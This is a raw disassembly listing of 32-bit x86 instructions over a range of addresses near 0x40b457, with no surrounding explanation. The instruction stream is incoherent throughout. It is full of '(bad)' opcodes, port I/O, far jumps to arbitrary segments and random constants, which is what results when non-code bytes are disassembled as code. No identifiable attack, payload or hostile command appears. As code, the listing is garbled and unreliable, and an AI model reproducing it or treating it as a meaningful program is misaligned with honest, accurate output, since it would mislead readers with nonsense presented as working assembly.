  40b457:	mov    edi,0xc1e3a3a3
  40b45c:	out    0xf0,al
  40b45e:	jmp    0x40b491
  40b460:	mov    ch,0xa
  40b462:	add    ecx,ecx
  40b464:	(bad)  
  40b466:	fcmove st,st(1)
  40b468:	mov    BYTE PTR [esi],bl
  40b46a:	pop    ss
  40b46b:	nop
  40b46c:	sahf   
  40b46d:	or     dh,0x87
  40b470:	add    ah,BYTE PTR [ebp+0x276078b7]
  40b476:	push   0xffffffa5
  40b478:	rcr    DWORD PTR [edi-0x2c],cl
  40b47b:	fsub   DWORD PTR [ebx-0x55]
  40b47e:	push   0x26
  40b480:	daa    
  40b481:	adc    al,0x92
  40b483:	pushf  
  40b484:	rcl    DWORD PTR [edx-0x7a75a063],0x90
  40b48b:	pop    esi
  40b48c:	lahf   
  40b48d:	scas   al,BYTE PTR es:[edi]
  40b48e:	sbb    eax,DWORD PTR [ebx+0x7de4caac]
  40b494:	dec    ebp
  40b495:	in     al,dx
  40b496:	adc    al,0xe6
  40b498:	sbb    dh,bl
  40b49a:	mov    eax,ds:0x442dacb6
  40b49f:	dec    edx
  40b4a0:	(bad)  
  40b4a1:	into   
  40b4a2:	outs   dx,BYTE PTR ds:[esi]
  40b4a3:	icebp  
  40b4a4:	aaa    
  40b4a5:	je     0x40b4d0
  40b4a7:	push   esp
  40b4a8:	add    bl,ah
  40b4aa:	popa   
  40b4ab:	loopne 0x40b469
  40b4ad:	sbb    DWORD PTR [esi-0x76177542],0xffffff95
  40b4b4:	lea    ecx,[edi-0x279ae035]
  40b4ba:	rcr    BYTE PTR [edx+0x4],cl
  40b4bd:	ret    
  40b4be:	and    BYTE PTR [eax+0x6d],bl
  40b4c1:	fdivr  DWORD PTR [edx-0x44bec571]
  40b4c7:	in     eax,dx
  40b4c8:	mov    edx,0x5c0cd041
  40b4cd:	sub    BYTE PTR [ebx+ebp*2-0x2e],0x1e
  40b4d2:	cmp    DWORD PTR ds:[edx],ecx
  40b4d5:	push   eax
  40b4d6:	mov    ecx,0x5cba9f7b
  40b4db:	ret    0x4847
  40b4de:	cmp    ebx,esi
  40b4e0:	adc    bh,bl
  40b4e2:	dec    ecx
  40b4e3:	sub    ecx,DWORD PTR [ebx]
  40b4e5:	call   0xed0c:0x1af85a1a
  40b4ec:	push   ss
  40b4ed:	loope  0x40b562
  40b4ef:	jl     0x40b499
  40b4f1:	test   BYTE PTR [edx],cl
  40b4f3:	leave  
  40b4f4:	sbb    ebx,DWORD PTR [eax-0x5e]
  40b4f7:	xor    al,BYTE PTR [ecx+0x76f36b6c]
  40b4fd:	dec    esi
  40b4fe:	jg     0x40b557
  40b500:	or     ebx,esp
  40b502:	fsubr  DWORD PTR [edi]
  40b504:	pop    esp
  40b505:	cdq    
  40b506:	jp     0x40b4a7
  40b508:	pushf  
  40b509:	arpl   WORD PTR es:[edi-0x1f],bx
  40b50d:	mov    dh,0xd8
  40b50f:	jle    0x40b58c
  40b511:	outs   dx,BYTE PTR ds:[esi]
  40b512:	mov    ds:0x617ebfcf,al
  40b517:	inc    edx
  40b518:	aaa    
  40b519:	pusha  
  40b51a:	cmp    bl,0xf8
  40b51d:	es mov al,0x27
  40b520:	call   0xc89f:0x77d36766
  40b527:	mov    edx,0xa6583d17
  40b52c:	imul   BYTE PTR [ebp-0x1088c3fe]
  40b532:	xchg   ebp,eax
  40b533:	mov    eax,0x3d4168fb
  40b538:	sub    al,0xb5
  40b53a:	fmul   QWORD PTR [ebp+0x3f7a58bd]
  40b540:	jp     0x40b5be
  40b542:	cmp    eax,0xfcee2723
  40b547:	cmp    DWORD PTR [ebp+0x76f98b6c],edx
  40b54d:	gs and eax,0xbeed977a
  40b553:	sub    eax,0x8e34df38
  40b558:	mov    ecx,esi
  40b55a:	mov    edi,0x39c25616
  40b55f:	mov    esi,0x158681a0
  40b564:	icebp  
  40b565:	fldcw  WORD PTR [edx+0x61c7d777]
  40b56b:	ins    DWORD PTR es:[edi],dx
  40b56c:	jno    0x40b52f
  40b56e:	stc    
  40b56f:	inc    esp
  40b570:	das    
  40b571:	int3   
  40b572:	jb     0x40b522
  40b574:	sub    BYTE PTR [esi-0x663bac51],ah
  40b57a:	fidivr WORD PTR [ecx-0x45cea165]
  40b580:	fnstsw WORD PTR [ebp-0x4d]
  40b583:	and    esi,edx
  40b585:	pop    ss
  40b586:	add    bl,BYTE PTR [edx]
  40b588:	loope  0x40b52e
  40b58a:	cwde   
  40b58b:	arpl   WORD PTR [esi],sp
  40b58d:	dec    esi
  40b58e:	xor    edx,DWORD PTR [ebp+0x3c]
  40b591:	mov    al,ds:0x9984409f
  40b596:	xor    esi,DWORD PTR [ecx+0x3]
  40b599:	jne    0x40b55b
  40b59b:	mov    bl,0x9a
  40b59d:	cmp    cl,al
  40b59f:	push   0xe1568aa7
  40b5a4:	cdq    
  40b5a5:	sbb    eax,DWORD PTR [edi-0x3a340b1]
  40b5ab:	xchg   ecx,eax
  40b5ac:	add    edx,edx
  40b5ae:	push   ebx
  40b5af:	pop    edx
  40b5b0:	pusha  
  40b5b1:	mov    ah,0x24
  40b5b3:	mov    bl,0x5b
  40b5b5:	ins    BYTE PTR es:[edi],dx
  40b5b6:	ds mov dh,0x73
  40b5b9:	jl     0x40b624
  40b5bb:	loope  0x40b5e4
  40b5bd:	or     edx,DWORD PTR [ecx-0x7c]
  40b5c0:	pop    esi
  40b5c1:	outs   dx,BYTE PTR ds:[esi]
  40b5c2:	xlat   BYTE PTR ds:[ebx]
  40b5c3:	or     DWORD PTR [ebp-0x5d],edi
  40b5c6:	add    BYTE PTR [edi+0x714880e7],ah
  40b5cc:	adc    dh,BYTE PTR [ebp+0x16f525cf]
  40b5d2:	xchg   ebx,eax
  40b5d3:	sbb    al,0x94
  40b5d5:	jnp    0x40b5f4
  40b5d7:	repz lds esi,FWORD PTR [edi+0x6ad0e15f]
  40b5de:	sar    BYTE PTR [edi],0xad
  40b5e1:	outs   dx,BYTE PTR ds:[esi]
  40b5e2:	xchg   esp,eax
  40b5e3:	fld    QWORD PTR [esp+ebp*4]
  40b5e6:	push   ds
  40b5e7:	xchg   edx,eax
  40b5e8:	xchg   ecx,eax
  40b5e9:	mov    bh,0x3c
  40b5eb:	in     al,dx
  40b5ec:	pop    ecx
  40b5ed:	std    
  40b5ee:	cmp    al,0x63
  40b5f0:	ss mov eax,0x9ab6b000
  40b5f6:	xchg   edx,edi
  40b5f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5f9:	dec    esi
  40b5fa:	lods   al,BYTE PTR ds:[esi]
  40b5fb:	aaa    
  40b5fc:	fcom   DWORD PTR [edi+0x46a89ebd]
  40b602:	mov    ch,0x33
  40b604:	pusha  
  40b605:	stos   BYTE PTR es:[edi],al
  40b606:	and    al,0x7c
  40b609:	adc    al,0x32
  40b60b:	sbb    edx,DWORD PTR [ecx+eax*8]
  40b60e:	xchg   edx,eax
  40b60f:	mov    ss,WORD PTR [edi+ecx*4-0x4a]
  40b613:	out    dx,eax
  40b614:	mov    dl,0x75
  40b616:	repz dec ecx
  40b618:	dec    ebp
  40b619:	xchg   ecx,eax
  40b61a:	cdq    
  40b61b:	fwait
  40b61c:	push   eax
  40b61d:	aas    
  40b61e:	pop    es
  40b61f:	cld    
  40b620:	push   0xa3a4853e
  40b625:	jle    0x40b616
  40b627:	xchg   ecx,eax
  40b628:	mov    al,0x57
  40b62a:	adc    al,0x83
  40b62c:	in     eax,0xb6
  40b62e:	fimul  WORD PTR [edi+0x4d]
  40b631:	fdivr  DWORD PTR [esi+eax*1]
  40b634:	(bad)  
  40b635:	mov    cs,WORD PTR [esi+0x6e]
  40b638:	or     BYTE PTR [esi-0x3647a8d7],dh
  40b63e:	fadd   DWORD PTR [esi]
  40b640:	popf   
  40b641:	ffree  st(7)
  40b643:	mov    ds:0xd23c839f,al
  40b648:	in     eax,dx
  40b649:	dec    eax
  40b64a:	stos   BYTE PTR es:[edi],al
  40b64b:	test   DWORD PTR [edx-0x361551c4],edi
  40b651:	mov    esi,gs
  40b653:	push   ebp
  40b654:	pop    edx
  40b655:	in     eax,0xfc
  40b657:	inc    esp
  40b658:	loop   0x40b621
  40b65a:	sub    eax,0x2a42521b
  40b65f:	fstp   TBYTE PTR [edx]
  40b662:	stos   BYTE PTR es:[edi],al
  40b663:	mov    ecx,0x9afad77f
  40b668:	je     0x40b6e2
  40b66a:	rcr    BYTE PTR [edi],0x4f
  40b66d:	cdq    
  40b66e:	adc    BYTE PTR [ebp+0x5dec4f77],al
  40b674:	add    dl,bh
  40b676:	sub    al,0xa0
  40b678:	gs lahf 
  40b67a:	rcl    BYTE PTR [eax+0x1509f789],0x44
  40b681:	fcomp  DWORD PTR [ebx+0x3144b8ef]
  40b687:	mov    ds:0xf6b5985d,al
  40b68c:	outs   dx,BYTE PTR ds:[esi]
  40b68d:	and    al,0xa9
  40b690:	xor    eax,0x5d8a7be2
  40b695:	adc    DWORD PTR [ecx],ebx
  40b697:	inc    ebp
  40b698:	stos   BYTE PTR es:[edi],al
  40b699:	sbb    DWORD PTR [ebp+0x55],esp
  40b69c:	mov    esi,ecx
  40b69e:	xchg   ebx,eax
  40b69f:	aas    
  40b6a0:	inc    eax
  40b6a1:	adc    eax,0x8b9a51b9
  40b6a6:	inc    ecx
  40b6a7:	jl     0x40b629
  40b6a9:	pop    edx
  40b6aa:	xor    cl,BYTE PTR [edx-0x5d]
  40b6ad:	add    esi,DWORD PTR [edi-0x4f]
  40b6b0:	dec    eax
  40b6b1:	jns    0x40b6fc
  40b6b3:	fld    DWORD PTR [esi]
  40b6b5:	out    dx,al
  40b6b6:	(bad)  
  40b6b7:	xchg   ebx,eax
  40b6b8:	imul   ecx,DWORD PTR [edx],0xffffffdf
  40b6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6bc:	repnz mov esi,0xd71afdf1
  40b6c2:	inc    esp
  40b6c3:	inc    ebp
  40b6c4:	jg     0x40b708
  40b6c6:	and    eax,0x22374ee
  40b6cb:	inc    ecx
  40b6cc:	dec    eax
  40b6cd:	int    0xa4
  40b6cf:	mov    esi,0xe93aa024
  40b6d4:	sbb    BYTE PTR [ecx-0xe],0xb0
  40b6d8:	pop    eax
  40b6d9:	les    esp,FWORD PTR [ebp+esi*1+0x5a]
  40b6dd:	cli    
  40b6de:	jno    0x40b6ac
  40b6e0:	das    
  40b6e1:	jnp    0x40b67a
  40b6e3:	call   0x29cab868
  40b6e8:	push   ss
  40b6e9:	stos   DWORD PTR es:[edi],eax
  40b6ea:	sub    edi,0x32
  40b6ed:	jmp    0x40b695
  40b6ef:	mov    dh,0xfa
  40b6f1:	lds    eax,FWORD PTR [edi-0x3]
  40b6f4:	or     DWORD PTR [eax+eiz*8+0x28bfc47a],ebx
  40b6fb:	rcr    DWORD PTR [ebp-0x26e3db77],cl
  40b701:	xchg   ebx,eax
  40b702:	imul   edx,DWORD PTR [edx+0x5fc75c4e],0x34
  40b709:	mov    bl,0xdc
  40b70b:	mov    eax,ds:0x8fb35856
  40b710:	jbe    0x40b719
  40b712:	(bad)  
  40b714:	xor    al,0x6a
  40b716:	add    bh,ch
  40b718:	xor    DWORD PTR ds:0x4273dd89,edi
  40b71e:	xor    BYTE PTR [edx-0x4f],dh
  40b721:	push   esp
  40b722:	xlat   BYTE PTR ds:[ebx]
  40b723:	mov    cl,0xca
  40b725:	jno    0x40b757
  40b727:	popf   
  40b728:	imul   ebp,DWORD PTR [ebx+edi*2-0x1e],0x775d7c73
  40b730:	int3   
  40b731:	sbb    al,0x40
  40b733:	in     eax,dx
  40b734:	cdq    
  40b735:	or     al,0x54
  40b737:	pop    ebx
  40b738:	inc    ebx
  40b739:	ds rol edx,cl
  40b73c:	clc    
  40b73d:	fs popa 
  40b73f:	rcl    eax,1
  40b741:	add    DWORD PTR [esi+0x3b],ecx
  40b744:	pop    ebp
  40b745:	(bad)  
  40b746:	aaa    
  40b747:	out    0x4e,eax
  40b749:	adc    esp,eax
  40b74b:	lock adc BYTE PTR [edi],cl
  40b74e:	iret   
  40b74f:	sahf   
  40b750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b751:	sbb    eax,0x3d287170
  40b756:	arpl   WORD PTR [eax],bx
  40b758:	xchg   ebp,eax
  40b759:	ins    BYTE PTR es:[edi],dx
  40b75a:	inc    ebp
  40b75b:	pop    ebp
  40b75c:	adc    DWORD PTR [edx+edi*8],ebp
  40b75f:	sub    DWORD PTR [esi],eax
  40b761:	pop    ebx
  40b762:	daa    
  40b763:	cmp    eax,0x4fbcf7f
  40b768:	push   ebp
  40b769:	ds cmp eax,0x3825c318
  40b76f:	aaa    
  40b770:	shr    DWORD PTR [ecx],cl
  40b772:	sbb    al,0x6c
  40b774:	inc    esi
  40b775:	or     al,BYTE PTR [edx+0xd587ef3]
  40b77b:	mov    esi,0x2c822001
  40b780:	sbb    DWORD PTR [ebx+0x52],esp
  40b783:	sahf   
  40b784:	add    bl,BYTE PTR [esi+0xf591a52]
  40b78a:	mov    esp,0x86efc348
  40b78f:	inc    eax
  40b790:	int3   
  40b791:	sbb    eax,0xbc0cf95c
  40b796:	lods   al,BYTE PTR ds:[esi]
  40b797:	pop    ecx
  40b798:	xor    al,0xdb
  40b79a:	test   al,0x89
  40b79c:	adc    eax,0x7282c57
  40b7a1:	inc    edx
  40b7a2:	cmp    al,BYTE PTR [edi]
  40b7a4:	cld    
  40b7a5:	dec    ecx
  40b7a6:	jnp    0x40b77f
  40b7a8:	jmp    0x45760848
  40b7ad:	or     DWORD PTR [edi+ebx*2-0x484f8d08],ecx
  40b7b4:	pop    edi
  40b7b5:	inc    eax
  40b7b6:	stos   DWORD PTR es:[edi],eax
  40b7b7:	pop    edx
  40b7b8:	rcl    esi,cl
  40b7ba:	mov    WORD PTR [edx],ss
  40b7bc:	cmp    DWORD PTR [ecx+0x4654ef95],edx
  40b7c2:	enter  0xd11d,0x2d
  40b7c6:	hlt    
  40b7c7:	or     eax,0xbd9a1c41
  40b7cc:	je     0x40b81d
  40b7ce:	popf   
  40b7cf:	mov    dl,0x7d
  40b7d1:	push   edx
  40b7d2:	xor    eax,0xc4df7bd5
  40b7d7:	(bad)  
  40b7d8:	cs enter 0xa95d,0x2d
  40b7dd:	jp     0x40b7b4
  40b7df:	gs int3 
  40b7e1:	lds    ebx,FWORD PTR [edi-0x6a7f54b3]
  40b7e7:	shr    DWORD PTR [ecx+0x3aa65300],1
  40b7ed:	dec    eax
  40b7ee:	pop    edi
  40b7ef:	sbb    al,0x49
  40b7f1:	inc    ecx
  40b7f2:	add    eax,DWORD PTR [ecx-0x2b]
  40b7f5:	(bad)  [ecx+0x78886217]
  40b7fb:	mov    edi,0x38a340e0
  40b800:	lds    edi,FWORD PTR [esi-0x402ea31a]
  40b806:	sbb    al,0x19
  40b808:	fisub  WORD PTR [ebx-0x55374ca2]
  40b80e:	out    0xc0,al
  40b810:	stc    
  40b811:	push   esp
  40b812:	iret   
  40b813:	aad    0x64
  40b815:	dec    ebx
  40b816:	sahf   
  40b817:	les    eax,FWORD PTR [ecx+0x60]
  40b81a:	sti    
  40b81b:	call   0x89c9:0x5ee76568
  40b822:	jne    0x40b867
  40b824:	ins    BYTE PTR es:[edi],dx
  40b825:	cli    
  40b826:	add    esp,DWORD PTR [ebx+0x2c]
  40b829:	mov    dh,0xe1
  40b82b:	hlt    
  40b82c:	call   0xdc48:0x4c7a1590
  40b833:	xor    BYTE PTR [ebx+0x10770e22],ah
  40b839:	xchg   ebx,eax
  40b83a:	jo     0x40b844
  40b83c:	cmp    DWORD PTR [ecx+0x8123803],esi
  40b842:	retf   
  40b843:	cli    
  40b844:	jmp    0x40b817
  40b846:	push   cs
  40b847:	dec    esp
  40b848:	cwde   
  40b849:	retf   
  40b84a:	lods   eax,DWORD PTR ds:[esi]
  40b84b:	fld    st(2)
  40b84d:	stc    
  40b84e:	jg     0x40b7d8
  40b850:	loop   0x40b833
  40b852:	mov    al,0x7e
  40b854:	fidivr WORD PTR [ecx]
  40b856:	cmp    al,0x28
  40b858:	or     ch,BYTE PTR ds:0x29eb1111
  40b85e:	or     esi,DWORD PTR [ecx+0x6c]
  40b861:	fimul  DWORD PTR [ecx+0x690a6e7e]
  40b867:	and    esi,DWORD PTR [ecx+0x3ccc48b8]
  40b86d:	or     dl,ch
  40b86f:	mov    esi,0x72d65ddc
  40b874:	jne    0x40b84e
  40b876:	add    eax,0x36cef7ab
  40b87b:	sbb    al,0x64
  40b87d:	lds    eax,FWORD PTR [eax]
  40b87f:	and    ecx,edx
  40b881:	mov    ebx,0xe9f7b08
  40b886:	cld    
  40b887:	sub    bl,BYTE PTR [ebx]
  40b889:	dec    ecx
  40b88a:	jmp    0x1851:0x61f5b56a
  40b891:	add    al,ah
  40b893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b894:	inc    ebx
  40b895:	int3   
  40b896:	inc    edi
  40b897:	scas   al,BYTE PTR es:[edi]
  40b898:	sahf   
  40b899:	test   al,0xb2
  40b89b:	cli    
  40b89c:	dec    eax
  40b89d:	fs push ds
  40b89f:	nop
  40b8a0:	stos   BYTE PTR es:[edi],al
  40b8a1:	out    0xe6,eax
  40b8a3:	pop    es
  40b8a4:	addr16 std 
  40b8a6:	cmp    al,0x3b
  40b8a8:	sahf   
  40b8a9:	mov    ebx,0x909bfaca
  40b8ae:	jno    0x40b8bc
  40b8b0:	jle    0x40b86b
  40b8b2:	jne    0x40b8f5
  40b8b4:	mov    dh,0xfa
  40b8b6:	inc    ecx
  40b8b7:	jmp    0xbc8e:0x7481b81e
  40b8be:	loopne 0x40b93a
  40b8c0:	rol    ebx,cl
  40b8c2:	sbb    al,0xc8
  40b8c4:	iret   
  40b8c5:	dec    esi
  40b8c6:	inc    esp
  40b8c7:	stos   DWORD PTR es:[edi],eax
  40b8c8:	or     eax,0x75b7beb7
  40b8cd:	lods   eax,DWORD PTR ds:[esi]
  40b8ce:	test   DWORD PTR [edx+eax*4+0x1d],ecx
  40b8d2:	push   ecx
  40b8d3:	mov    al,0x5f
  40b8d5:	push   ecx
  40b8d6:	jo     0x40b893
  40b8d8:	push   ecx
  40b8d9:	or     al,0xae
  40b8db:	cmp    BYTE PTR [ebx],ch
  40b8dd:	and    DWORD PTR ds:0xdee8e46d,esi
  40b8e3:	xor    ah,bl
  40b8e5:	sub    al,0x1b
  40b8e7:	int    0xed
  40b8e9:	mov    bh,0xf9
  40b8eb:	mov    edi,0x67c1f09f
  40b8f0:	xchg   ebp,eax
  40b8f1:	call   0x305a:0xd037c9e3
  40b8f8:	mov    esi,0xe6902a09
  40b8fd:	push   ebp
  40b8fe:	mov    es,WORD PTR [esi]
  40b900:	pop    ecx
  40b901:	stc    
  40b902:	mov    eax,ds:0x9421e0de
  40b907:	push   ecx
  40b908:	das    
  40b909:	or     al,0xf5
  40b90b:	add    ebp,ebx
  40b90d:	xlat   BYTE PTR ds:[ebx]
  40b90e:	mov    BYTE PTR [ebp-0x4acbb20f],dl
  40b914:	jne    0x40b900
  40b916:	test   DWORD PTR [edi-0x6f],esi
  40b919:	mov    edx,0xf25e2ae2
  40b91e:	push   ebx
  40b91f:	int    0xde
  40b921:	std    
  40b922:	jmp    0x2c83:0x2cd23cf4
  40b929:	je     0x40b970
  40b92b:	scas   al,BYTE PTR es:[edi]
  40b92c:	pop    esi
  40b92d:	push   ss
  40b92e:	cli    
  40b92f:	mul    BYTE PTR [ebx+ebp*1+0x73afe006]
  40b936:	pop    esp
  40b937:	sbb    eax,0xb41b1c61
  40b93c:	mov    ah,0x68
  40b93e:	int    0x52
  40b940:	std    
  40b941:	jmp    FWORD PTR [eax-0x36]
  40b944:	push   ebp
  40b945:	and    eax,0x14b7615a
  40b94a:	add    eax,0x8f00bd6
  40b94f:	pop    edx
  40b950:	jp     0x40b9ac
  40b952:	gs push esp
  40b954:	adc    dh,BYTE PTR ds:0x417a9045
  40b95a:	xchg   esp,eax
  40b95b:	cli    
  40b95c:	inc    esp
  40b95d:	xor    al,0xe3
  40b95f:	pop    edx
  40b960:	dec    esp
  40b961:	repz mov dl,0xc8
  40b964:	adc    ah,BYTE PTR [edx-0x65]
  40b967:	jbe    0x40b9db
  40b969:	sbb    cl,BYTE PTR [edi]
  40b96b:	jno    0x40b955
  40b96d:	xor    eax,0xc44d6db5
  40b972:	retf   
  40b973:	out    0x26,eax
  40b975:	test   eax,0x1cd70c0d
  40b97a:	icebp  
  40b97b:	pop    eax
  40b97c:	aaa    
  40b97d:	xor    cl,BYTE PTR [esi+0x1c314be0]
  40b983:	sbb    DWORD PTR [eax-0x27160ba],eax
  40b989:	int3   
  40b98a:	mov    cl,0x1f
  40b98c:	cmc    
  40b98d:	out    dx,al
  40b98e:	or     BYTE PTR [ebp-0x2],0xc5
  40b992:	mov    ch,0x9f
  40b994:	pop    edi
  40b995:	addr16 ja 0x40b997
  40b998:	sub    DWORD PTR [ecx],0x21
  40b99b:	push   esi
  40b99c:	fstp   DWORD PTR [esi]
  40b99e:	add    al,0xa
  40b9a0:	retf   0xe030
  40b9a3:	sbb    ecx,DWORD PTR [ecx-0x738c7733]
  40b9a9:	dec    esi
  40b9aa:	adc    bl,BYTE PTR [ecx]
  40b9ac:	aad    0x77
  40b9ae:	pop    edi
  40b9af:	adc    DWORD PTR [edi-0x53d017c1],0xc513b4fb
  40b9b9:	push   esp
  40b9ba:	cmp    DWORD PTR [ebx],edx
  40b9bc:	cli    
  40b9bd:	loope  0x40b9ec
  40b9bf:	sub    BYTE PTR [ebx+0x52dc36c0],bl
  40b9c5:	cmp    eax,0xedfc202e
  40b9ca:	fld    st(2)
  40b9cc:	pop    ecx
  40b9cd:	or     al,BYTE PTR [esi+0x5e]
  40b9d0:	jo     0x40b98d
  40b9d2:	outs   dx,DWORD PTR ds:[esi]
  40b9d3:	add    ebp,ecx
  40b9d5:	gs clc 
  40b9d7:	push   0xef89312e
  40b9dc:	btr    DWORD PTR [ebx+eax*1+0x3a],eax
  40b9e1:	orps   xmm3,XMMWORD PTR [ebp+edi*8+0x76b7918a]
  40b9e9:	mov    dl,0x22
  40b9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ec:	cdq    
  40b9ed:	arpl   WORD PTR [ebp-0x43d52c99],bx
  40b9f3:	dec    edx
  40b9f4:	cdq    
  40b9f5:	cmp    esp,edx
  40b9f7:	jg     0x40b9f0
  40b9f9:	mov    ss,WORD PTR [ebx]
  40b9fb:	arpl   ax,cx
  40b9fd:	add    edx,esi
  40b9ff:	add    al,0xaa
  40ba01:	inc    ecx
  40ba02:	lock loopne 0x40b995
  40ba05:	ins    DWORD PTR es:[edi],dx
  40ba06:	push   ecx
  40ba07:	sub    al,0x49
  40ba09:	sti    
  40ba0a:	and    DWORD PTR [esi],esi
  40ba0c:	stc    
  40ba0d:	repnz inc ebp
  40ba0f:	popa   
  40ba10:	mov    edi,0x1d9a2ab6
  40ba15:	cmp    BYTE PTR [esi-0x59],al
  40ba18:	or     al,0x21
  40ba1a:	xor    edx,DWORD PTR [eax]
  40ba1c:	daa    
  40ba1d:	clc    
  40ba1e:	enter  0xdbe6,0xe6
  40ba22:	xchg   edx,eax
  40ba23:	enter  0x85b8,0x4a
  40ba27:	stos   BYTE PTR es:[edi],al
  40ba28:	aad    0xe5
  40ba2a:	xchg   ebp,eax
  40ba2b:	pop    ecx
  40ba2c:	inc    esp
  40ba2d:	cmp    BYTE PTR [eax],0x4f
  40ba30:	daa    
  40ba31:	imul   edx,DWORD PTR [ecx],0xffffffad
  40ba34:	or     eax,0x374253dd
  40ba39:	sbb    edx,DWORD PTR [edi+0x5b]
  40ba3c:	dec    ebp
  40ba3d:	mov    ds:0x96431243,eax
  40ba42:	repz in eax,dx
  40ba44:	pop    ebp
  40ba45:	jno    0x40ba66
  40ba47:	pop    edx
  40ba48:	js     0x40ba36
  40ba4a:	add    dl,dh
  40ba4c:	nop
  40ba4d:	xor    ecx,esi
  40ba4f:	inc    eax
  40ba50:	dec    esi
  40ba51:	xchg   ebp,eax
  40ba52:	xchg   esi,eax
  40ba53:	pop    ebx
  40ba54:	inc    eax
  40ba55:	(bad)  
  40ba56:	retf   
  40ba57:	push   esp
  40ba58:	js     0x40bab3
  40ba5a:	jmp    0x9e624ed8
  40ba5f:	pop    ecx
  40ba60:	(bad)  
  40ba61:	in     al,0xc6
  40ba63:	jmp    DWORD PTR [eax+0x3f]
  40ba66:	cld    
  40ba67:	mov    bh,0xfb
  40ba69:	push   ss
  40ba6a:	fist   DWORD PTR [ebp+0x2bb5b459]
  40ba70:	push   0xffffffad
  40ba72:	imul   esi,DWORD PTR [eax-0x25],0x3d435c8b
  40ba79:	fs jg  0x40bac1
  40ba7c:	repnz mov dh,BYTE PTR [esi+0x6]
  40ba80:	and    esp,ebp
  40ba82:	and    BYTE PTR [eax],0xad
  40ba85:	xchg   ecx,eax
  40ba86:	xor    DWORD PTR [eax+eax*4],ebp
  40ba89:	jp     0x40ba8d
  40ba8b:	shl    BYTE PTR [eax+0x5f],1
  40ba8e:	retf   
  40ba8f:	scas   eax,DWORD PTR es:[edi]
  40ba90:	into   
  40ba91:	outs   dx,BYTE PTR ds:[esi]
  40ba92:	fsubr  DWORD PTR [edi]
  40ba94:	jae    0x40ba5b
  40ba96:	or     DWORD PTR [edx+0x5c],0xffffffe6
  40ba9a:	repnz dec esp
  40ba9c:	sbb    esp,DWORD PTR [ebp-0x4c]
  40ba9f:	test   dh,0xfe
  40baa2:	jnp    0x40babb
  40baa4:	repnz mov al,ds:0x77f3a4e7
  40baaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baab:	inc    eax
  40baac:	push   ecx
  40baad:	mov    ecx,esi
  40baaf:	mov    al,0xc0
  40bab1:	jo     0x40ba58
  40bab3:	and    DWORD PTR [ebx+0x69377785],ebx
  40bab9:	into   
  40baba:	inc    esp
  40babb:	enter  0xb6e8,0xe1
  40babf:	sbb    DWORD PTR [ebx-0x51a0966d],ebx
  40bac5:	iret   
  40bac6:	pop    ecx
  40bac7:	and    BYTE PTR es:[eax-0x55686b2],bh
  40bace:	sar    DWORD PTR [ecx+0x5e45b21d],cl
  40bad4:	lods   eax,DWORD PTR ds:[esi]
  40bad5:	mov    ebx,0xc91bc127
  40bada:	pop    edi
  40badb:	leave  
  40badc:	sbb    eax,0xc1c6d539
  40bae1:	icebp  
  40bae2:	outs   dx,DWORD PTR ds:[esi]
  40bae3:	repz fs jmp 0xe5cb:0x6e84ce77
  40baec:	xchg   esi,eax
  40baed:	cwde   
  40baee:	add    eax,0x23a71351
  40baf3:	add    ebx,DWORD PTR [ecx]
  40baf5:	sti    
  40baf6:	test   BYTE PTR [eax-0x48],bl
  40baf9:	ja     0x40bb2b
  40bafb:	lock xchg ebp,eax
  40bafd:	inc    eax
  40bafe:	ret    0x906b
  40bb01:	test   BYTE PTR [ebp+0x60134bd4],bl
  40bb07:	ss mov ebp,0x3ce7a9e8
  40bb0d:	mov    ebp,0xd3370675
  40bb12:	mov    cs,WORD PTR [edi-0x45ebe0b9]
  40bb18:	dec    ebp
  40bb19:	in     eax,dx
  40bb1a:	pop    ebx
  40bb1b:	loopne 0x40bb42
  40bb1d:	jmp    0x6acf2792
  40bb22:	mov    al,0xe8
  40bb24:	and    eax,0x6e1ce884
  40bb29:	pusha  
  40bb2a:	jmp    0xab46:0xee4d6129
  40bb31:	rol    DWORD PTR [eax],0xa4
  40bb34:	outs   dx,BYTE PTR ds:[esi]
  40bb35:	jns    0x40bb88
  40bb37:	push   0xef6a5f95
  40bb3c:	push   es
  40bb3d:	inc    edx
  40bb3e:	loope  0x40bba2
  40bb40:	mov    ds:0x54e1a0f7,eax
  40bb45:	outs   dx,BYTE PTR ds:[esi]
  40bb46:	idiv   ecx
  40bb48:	jnp    0x40bb6b
  40bb4a:	mov    esi,ebp
  40bb4c:	pop    esp
  40bb4d:	scas   al,BYTE PTR es:[edi]
  40bb4e:	mov    ebx,0xfa6b4999
  40bb53:	js     0x40bb7e
  40bb55:	int3   
  40bb56:	dec    eax
  40bb57:	outs   dx,DWORD PTR ds:[esi]
  40bb58:	mov    ah,BYTE PTR [edx]
  40bb5a:	adc    al,0x4c
  40bb5c:	mov    ebx,0x3ea5cdf8
  40bb61:	bound  esi,QWORD PTR ds:[eax+0x12c6118b]
  40bb68:	jo     0x40bb82
  40bb6a:	dec    esi
  40bb6b:	outs   dx,BYTE PTR ds:[esi]
  40bb6c:	mov    bl,0x76
  40bb6e:	mov    eax,0x1f2923ae
  40bb73:	push   0xc6f313b5
  40bb78:	mov    edx,0xa1b2ec1a
  40bb7d:	pop    eax
  40bb7e:	cmp    al,0x30
  40bb80:	into   
  40bb81:	pushf  
  40bb82:	or     eax,esp
  40bb84:	out    0x22,eax
  40bb86:	std    
  40bb87:	mov    dl,0xb5
  40bb89:	pop    DWORD PTR [edx+0x72]
  40bb8c:	pop    ebx
  40bb8d:	sub    BYTE PTR [eax+0x38],ah
  40bb90:	test   al,0xe7
  40bb92:	inc    edx
  40bb93:	xor    al,0x88
  40bb95:	xchg   BYTE PTR [ebp-0x79],bl
  40bb98:	stc    
  40bb99:	test   BYTE PTR [ecx+0x6e],0xb7
  40bb9d:	pop    eax
  40bb9e:	aam    0xf7
  40bba0:	(bad)  
  40bba2:	adc    ecx,DWORD PTR [edx*1+0x373234b7]
  40bba9:	push   edx
  40bbaa:	into   
  40bbab:	sbb    ah,BYTE PTR [edi-0x24e7295e]
  40bbb1:	add    ebp,ecx
  40bbb3:	sahf   
  40bbb4:	in     al,dx
  40bbb5:	add    al,0xa2
  40bbb7:	dec    esp
  40bbb8:	push   0x6a02bc45
  40bbbd:	pushf  
